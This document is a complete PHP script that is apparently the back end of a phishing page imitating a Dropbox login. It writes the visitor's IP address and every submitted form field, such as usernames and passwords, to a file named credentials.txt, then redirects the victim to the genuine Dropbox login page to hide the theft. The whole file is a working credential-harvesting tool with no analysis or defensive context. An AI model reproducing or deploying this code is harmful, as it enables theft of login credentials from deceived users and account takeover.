<?php
$file = fopen("credentials.txt", "a");
$ip = $_SERVER['REMOTE_ADDR'];
fwrite($file, "IP Addr");
fwrite($file, ":");
fwrite($file, $ip);
fwrite($file, "\n");
foreach ($_POST as $key => $value) {
	fwrite($file, $key);
	fwrite($file, ":");
	fwrite($file, $value);
	fwrite($file, "\n");
}

fwrite($file, "\n");
fclose($file);
header("Location: https://www.dropbox.com/login");
die();
?>